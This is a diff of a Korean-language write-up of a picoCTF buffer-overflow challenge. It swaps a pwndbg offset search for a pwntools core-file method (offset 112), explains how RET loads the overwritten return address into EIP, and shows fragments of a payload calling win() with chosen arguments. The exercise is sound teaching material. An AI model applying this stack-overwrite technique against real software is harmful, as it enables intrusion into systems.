@@ -70,47 +70,33 @@ vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linke
 ```
 <br />
 
-# Exploitation
-문제에서 제공되는 정보 및 취약점을 취합해보면 다음과 같습니다.
-```text
-1. 32비트 환경
-2. win(0xCAFEF00D, 0xF00DF00D) 호출 -> FLAG 출력
-3. gets(buf) 호출 -> 버퍼오버플로우 발생
-4. Partial RELRO, No canary, No PIE
-```
-취합된 정보를 토대로 공격 과정을 정리하면, `gets()`는 입력 값의 길이를 검증하지 않기 때문에 스택 버퍼오버플로우가 발생하며, 해당 바이너리에는 canary가 적용되어 있지 않습니다. 따라서 해당 취약점으로 리턴 주소를 win()의 주소로 덮고, 인자를 요구하는 값으로 설정하면 FLAG가 출력될 것입니다.
-<br />
-<br />
-
 ## 1. 오프셋 구하기
-```yaml
-pwndbg> cyclic 200
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
-```
-중복되지 않는 무작위 값을 생성합니다.
-```yaml
-Please enter your string:
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
-pwndbg> c
-Continuing.
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
-
-Program received signal SIGSEGV, Segmentation fault.
-```
-무작위 값을 입력하고, `c`를 하여 오류가 발생하도록 합니다.
-```yaml
-pwndbg> i r eip
-eip            0x62616164          0x62616164
-```
-이후 해당 명령어로 eip에 저장된 값을 확인합니다. eip에 저장된 값은 `0x62616164`이며, 해당 값을 추적하여 버퍼 시작점부터 리턴 주소까지의 오프셋을 알아낼 수 있습니다.
-```yaml
-pwndbg> cyclic -l 0x62616164
-Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
-Found at offset 112
+```bash
+$ python3 -q
+>>> from pwn import *
+>>> p = process("./vuln")
+[+] Starting local process './vuln': pid 754
+>>> p.sendline(cyclic(200))
+>>> p.wait()
+[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 754)
+>>> Corefile("./core.754")
+[+] Parsing corefile...: Done
+[*] '/home/kali/pico/core.754'
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xff84a760
+    Exe:       '/home/kali/pico/vuln' (0x8048000)
+    Fault:     0x62616164
+Corefile('/home/kali/pico/core.754')
+>>> cyclic_find(0x62616164)
+112
 ```
 오프셋은 112 입니다.
 
 > [!NOTE]
+> 위 처럼 구할 수 있는 이유?
+> <br />
+>
 > 프로그램 종료 전 RET은 스택 최상단에 있는 복귀 주소(Return address)를 꺼내어 EIP에 넣고 프로그램의 흐름을 호출자(main)로 되돌립니다. 그러나 패턴 문자열로 버퍼 오버플로우를 일으키면, 이 복귀 주소가 패턴 데이터로 덮이게 됩니다. 그 결과 RET은 정상적인 복귀 주소 대신 패턴의 일부를 EIP에 복사하게 되고, 프로그램은 잘못된 주소로 점프하려다 크래시가 발생하게 됩니다. 이때 EIP에 저장된 값이 패턴 문자열의 몇 번째 위치인지 확인하면, 버퍼의 시작점에서 부터 Return Address까지의 정확한 오프셋을 계산할 수 있습니다.
 <br />
 
@@ -151,9 +137,6 @@ pay += p32(0xF00DF00D) # arg2 (ebp + 0xc)
 p.send(pay)
 p.interactive()
 ```
-<br />
-
-# FLAG
 ```bash
 $ python3 test.py
 [+] Opening connection to saturn.picoctf.net on port 55191: Done
